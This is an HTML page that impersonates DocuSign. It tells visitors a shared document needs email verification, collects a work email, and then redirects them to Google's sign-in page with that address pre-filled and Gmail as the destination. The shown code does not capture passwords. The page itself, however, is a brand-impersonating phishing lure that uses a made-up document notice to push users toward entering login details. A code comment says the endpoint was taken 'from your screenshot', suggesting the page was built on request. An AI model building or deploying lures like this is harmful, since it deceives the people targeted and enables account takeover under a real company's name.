<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document Notification - DocuSign</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .card {
            background: white;
            max-width: 500px;
            width: 100%;
            padding: 2rem;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            text-align: center;
        }
        .logo {
            margin-bottom: 1.5rem;
            font-size: 24px;
            font-weight: bold;
            color: #0056b3;
        }
        h1 {
            font-size: 1.6rem;
            font-weight: 600;
            margin-bottom: 1rem;
        }
        .message {
            font-size: 0.95rem;
            color: #444;
            margin-bottom: 1.5rem;
        }
        .highlight {
            background: #f0f7ff;
            padding: 0.8rem;
            border-radius: 8px;
            margin-bottom: 1.5rem;
            font-size: 0.9rem;
            color: #0056b3;
        }
        label {
            display: block;
            text-align: left;
            font-weight: 500;
            margin-bottom: 0.5rem;
        }
        input {
            width: 100%;
            padding: 12px;
            font-size: 1rem;
            border: 1px solid #ccc;
            border-radius: 6px;
            margin-bottom: 1.5rem;
        }
        button {
            background: #0073e6;
            color: white;
            border: none;
            padding: 12px;
            font-size: 1rem;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            font-weight: 600;
        }
        button:hover { background: #005bb5; }
        .help {
            margin-top: 1.5rem;
            font-size: 0.8rem;
            color: #666;
        }
        .help a { color: #0073e6; text-decoration: none; }
    </style>
</head>
<body>
<div class="card">
    <div class="logo">📄 DocuSign</div>
    <h1>Document Notification</h1>
    <div class="message">Please verify your email address to securely access your document.</div>
    <div class="highlight">For your privacy, Docusign Document Services requires authentication before granting access to shared documents.</div>
    <label for="email">Work or business email</label>
    <input type="email" id="email" name="email" placeholder="name@company.com" autocomplete="email">
    <button id="accessBtn">Access Document</button>
    <div class="help">Need help? <a href="#">Reach out to Docusign Support</a></div>
</div>

<script>
    const emailInput = document.getElementById('email');
    const accessBtn = document.getElementById('accessBtn');

    function redirectToGmail() {
        let email = emailInput.value.trim();
        if (!email) {
            alert('Please enter your work or business email.');
            return;
        }
        if (!email.includes('@') || !email.includes('.')) {
            alert('Please enter a valid email address (e.g., name@company.com).');
            return;
        }

        // Use the exact Google v3 sign-in endpoint (from your screenshot)
        // Parameters:
        // - Email: pre-fills the email field
        // - continue: after login, go to Gmail
        // - flowName & flowEntry: match Google's modern flow
        const googleUrl = `https://accounts.google.com/v3/signin/identifier?Email=${encodeURIComponent(email)}&continue=https://mail.google.com/mail/&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin`;

        // Redirect to Google
        window.location.href = googleUrl;
    }

    accessBtn.addEventListener('click', redirectToGmail);
    emailInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') redirectToGmail();
    });
</script>
</body>
</html>
